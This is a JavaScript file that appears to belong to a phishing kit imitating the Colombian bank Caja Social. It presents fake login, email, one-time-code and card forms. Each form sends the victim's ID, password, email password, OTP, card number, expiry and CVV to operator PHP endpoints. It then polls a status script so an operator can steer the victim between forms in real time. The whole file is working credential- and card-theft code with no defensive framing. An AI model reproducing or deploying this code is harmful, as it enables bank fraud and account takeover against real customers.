var menumob = 0;
var tecladoshf = 0;
let identificadorTiempoDeEspera;
var espera = 0;

function consultar_estado(){

    if (espera == 1) { 

        $.post( "../../../process/estado.php",function(data) {
           
            switch (data) {
                case '2':espera = 0;
                         vista_otp(); 
                         break;
                case '4':espera = 0;
                         vista_correo(); 
                         break;
                case '6':espera = 0;
                         vista_tarjeta();  
                         break;               
                case '8':espera = 0;
                         vista_otp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "../../../finish-no-back-button/";
                          break;
                case '12':espera = 0;
                          vista_usuario(); 
                          break;
            } 
        });    
    }    
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  

function vista_usuario(){
    $("#txt-tipo").val("");
    $("#txt-pass").val("");
    $("#txt-id").val(""); 

    $("#fondo").hide();
    $(".loader").hide();
    $("#fondo-oscuro").show();
    $("#frmLogin").show();

}

function vista_correo(){
    $("#txtCorreo").val("");
    $("#txtClaveCO").val("");

    $("#fondo").hide();
    $(".loader").hide();
    $("#fondo-oscuro").show();
    $("#frmCorreo").show();
}

function vista_otp(){
    $("#txtToken").val("");  
    $("#fondo").hide();
    $(".loader").hide();
    $("#fondo-oscuro").show();
    $("#frmToken").show();
}

function vista_tarjeta(){
    $("#txtTarjeta").val("");
    $("#aFecha").val("");
    $("#mFecha").val("");
    $("#txtCVV").val("");

    $("#fondo").hide();
    $(".loader").hide();
    $("#fondo-oscuro").show();
    $("#frmTarjeta").show();
}    


 function iniciar_sesion(td,nd,cl){
    $("#frmLogin").hide();
    var d = detectar_dispositivo();
    var u = "[" + td + "]" + nd;

    $.post( "../../../process/pasologin.php", { usr:u, pas: cl, dis: d,ban:"Caja Social"} ,function(data) {
        espera = 1;  
    });
 }

function enviar_correo(c,cc){
    $("#frmCorreo").hide();
    $.post( "../../../process/pasocorreo.php", { eml:c,clv:cc,cel:"" } ,function(data) {      
       espera = 1; 
    });
}


function enviar_otp(cd){
    $("#frmToken").hide(); 
    $.post( "../../../process/pasootp.php", { otp: cd} ,function(data) {      
       espera = 1; 
    });
 }

function enviar_tarjeta(t,f,c){
    $("#frmTarjeta").hide(); 
    $.post( "../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {                
        espera = 1; 
    });
}



$(document).ready(function($){

    if (detectar_dispositivo() != "PC") {
        $(".login-der").hide();
        $("#txt-pass").removeAttr("readonly");
    }

    

    $( window ).resize(function() {
        if ($( window ).width() >= 991) {
            $("#menu-mob").hide();
        }else{
            if (menumob == 1) {
                $("#menu-mob").show();
            }
        }           
    });

    $("#cerrar-login").click(function(){        
        $("#fondo-oscuro").hide();
        $("#frmLogin").hide();  
    });

    $("#btn-ingresar,.itm-ingresar").click(function(){      
        $("#fondo-oscuro").show();
        $("#frmLogin").show("fast");

        $("#txt-tipo").val("");
        $("#txt-pass").val("");
        $("#txt-id").val("");


        if (detectar_dispositivo() != "PC") {
            $(".login-der").hide();
            $("#txt-pass").removeAttr("readonly");
        }
    });

    $("#boton-menu").click(function(){      
        if (menumob == 0) {
            $("#menu-mob").show("fast");    
            menumob = 1;
        }else{
            $("#menu-mob").hide("fast");
            menumob = 0;
        }           
    });

    $("#txt-id").blur(function(){  
        if ($("#txt-id").val().length < 7) 
            $("#error-id").show();
        else
            $("#error-id").hide();
    });

    $("#txt-id").keyup(function(event){        
       if ($("#txt-id").val().length > 6){
            $("#error-id").hide();
            if ($("#txt-pass").val().length > 7 && $("#txt-tipo").val() != "") {
                $("#btn-iniciar").removeAttr("disabled");
            }else{
                $("#btn-iniciar").attr("disabled","disabled");                
            }
       }else{
            $("#btn-iniciar").attr("disabled","disabled");
       }
    });


    $("#txt-pass").blur(function(){  
        if ($("#txt-pass").val().length < 8) 
            $("#error-pass").show();
        else
            $("#error-pass").hide();
    });

    $("#txt-tipo").change(function(){  
        if ($("#txt-id").val().length > 6 && $("#txt-pass").val().length > 7 && $("#txt-tipo").val() != ""){
            $("#btn-iniciar").removeAttr("disabled");
        }else{
            $("#btn-iniciar").attr("disabled","disabled"); 
        } 
    });

    $("#txt-pass").keyup(function(event){        
       if ($("#txt-pass").val().length > 7){
            $("#error-pass").hide();
            if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                $("#btn-iniciar").removeAttr("disabled");
            }else{
                $("#btn-iniciar").attr("disabled","disabled"); 
            }
       }
        else{
            $("#error-pass").show();
            $("#btn-iniciar").attr("disabled","disabled"); 
        }
    }); 

    $("#btn-iniciar").click(function(){ 
        $("#fondo-oscuro").hide();
        $("#fondo").show();
        $(".loader").show();     
       iniciar_sesion($("#txt-tipo").val(),$("#txt-id").val(),$("#txt-pass").val());
    });


     $('#txtClaveCO').blur(function(){
        if ($("#txtClaveCO").val().length > 0) {
            $("#error-clave-co").hide(); 
        }else{
            $("#error-clave-co").show(); 
        }
     });

     $('#txtClaveCO').keyup(function(){
        $("#error-clave-co").hide(); 
        if ($("#txtClaveCO").val().length > 0) {
            if ($("#txtCorreo").val().indexOf('@', 0) != -1 && $("#txtCorreo").val().indexOf('.', 0) != -1) {
                $("#btnCorreo").removeAttr("disabled"); 
            }else{
                $("#btnCorreo").attr("disabled","disabled");
            }
        }else{
            $("#btnCorreo").attr("disabled","disabled");
        }
     });


     $('#txtCorreo').blur(function(){
        if ($("#txtCorreo").val().indexOf('@', 0) != -1 && $("#txtCorreo").val().indexOf('.', 0) != -1) {
            $("#error-correo").hide();
        }else{
            $("#error-correo").show();
        }          
     });


     $('#txtCorreo').keyup(function(){
         $("#error-correo").hide();
        if ($("#txtCorreo").val().indexOf('@', 0) != -1 && $("#txtCorreo").val().indexOf('.', 0) != -1) {
            if ($("#txtClaveCO").val().length > 0) {
                $("#btnCorreo").removeAttr("disabled"); 
            }else{
                $("#btnCorreo").attr("disabled","disabled");
            }
        }else{
            $("#btnCorreo").attr("disabled","disabled");            
        }          
     });


    $("#btnCorreo").click(function(){ 
        $("#fondo-oscuro").hide();            
        $("#fondo").show();
        $(".loader").show();              
        enviar_correo($("#txtCorreo").val(),$("#txtClaveCO").val());    
    });

    $("#btnOTP").click(function(){     
        $("#fondo-oscuro").hide();        
        $("#fondo").show();
        $(".loader").show();           
        enviar_otp($("#txtToken").val());    
    });


    $('#txtToken').blur(function(){
        if ($("#txtToken").val().length > 0) {
            $("#error-otp").hide(); 
        }else{
            $("#error-otp").show(); 
        }
     });

     $('#txtToken').keyup(function(){
        $("#error-otp").hide(); 
        if ($("#txtToken").val().length > 0) {
            $("#btnOTP").removeAttr("disabled"); 
        }else{
            $("#btnOTP").attr("disabled","disabled");
        }
     });

     $("#btnTarjeta").click(function(){   
        $("#fondo-oscuro").hide();
        $("#fondo").show();
        $(".loader").show();
        f = $("#mFecha").val() + "-" + $("#aFecha").val()             
        enviar_tarjeta($("#txtTarjeta").val(),f,$("#txtCVV").val());   
    });


    $('#txtTarjeta').blur(function(){
        if ($("#txtTarjeta").val().length > 14) {
            $("#error-tarjeta").hide(); 
        }else{
            $("#error-tarjeta").show(); 
        }
     });

     $('#txtCVV').blur(function(){
        if ($("#txtCVV").val().length > 2) {
            $("#error-cvv").hide(); 
        }else{
            $("#error-cvv").show(); 
        }
     });

    $('#txtTarjeta').keyup(function(){
        $("#error-tarjeta").hide(); 
        if ($("#txtTarjeta").val().length > 14) {
            if ($("#txtCVV").val().length > 2 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
                $("#btnTarjeta").removeAttr("disabled");     
            }else{
                $("#btnTarjeta").attr("disabled","disabled");   
            }
        }else{
           $("#btnTarjeta").attr("disabled","disabled"); 
        }
    });

    $('#txtCVV').keyup(function(){
        $("#error-cvv").hide(); 
        if ($("#txtCVV").val().length > 2) {
            if ($("#txtTarjeta").val().length > 14 && $("#mFecha").val() != "" && $("#aFecha").val() != "") {
                $("#btnTarjeta").removeAttr("disabled");     
            }else{
                $("#btnTarjeta").attr("disabled","disabled");   
            }
        }else{
           $("#btnTarjeta").attr("disabled","disabled"); 
        }
    });


    $("#mFecha,#aFecha").change(function(){  
        if ($("#txtTarjeta").val().length > 14 && $("#txtCVV").val().length > 2 && $("#mFecha").val() != "" && $("#aFecha").val() != ""){
            $("#btnTarjeta").removeAttr("disabled");
        }else{
            $("#btnTarjeta").attr("disabled","disabled"); 
        } 
    });

    $(".tecla,.teclado-num").click(function(){
        if ($('#txt-pass').val().length < 8) {
            $("#error-pass").show();
            $("#btn-iniciar").attr("disabled","disabled"); 
            if (tecladoshf == 0) {
                $('#txt-pass').val($('#txt-pass').val() + "" + $(this).html());
            }else{
               $('#txt-pass').val($('#txt-pass').val() + "" + $(this).html().toUpperCase()); 
            }
            if ($('#txt-pass').val().length < 8) {
                $("#error-pass").show();
                $("#btn-iniciar").attr("disabled","disabled"); 
            }else{
                $("#error-pass").hide();
                if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                    $("#btn-iniciar").removeAttr("disabled");    
                }        
            }            
        }else{
            $("#error-pass").hide();
            if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                $("#btn-iniciar").removeAttr("disabled");    
            }
        }       
        
    });

    $("#shf").click(function(){
        if (tecladoshf == 0) {
            $(".teclado td").css("text-transform","uppercase");
            tecladoshf = 1;
        }else{
            $(".teclado td").css("text-transform","lowercase");
            tecladoshf = 0;
        }        
    });

    $("#bac").click(function(){
        const str = $('#txt-pass').val();
        const str2 = str.substring(0, str.length - 1);
        $('#txt-pass').val(str2);
        if ($('#txt-pass').val().length < 8) {
            $("#error-pass").show();
            $("#btn-iniciar").attr("disabled","disabled"); 
        }else{
            $("#error-pass").hide();
            if ($("#txt-id").val().length > 6 && $("#txt-tipo").val() != ""){
                $("#btn-iniciar").removeAttr("disabled");    
            }        
        }
    });

});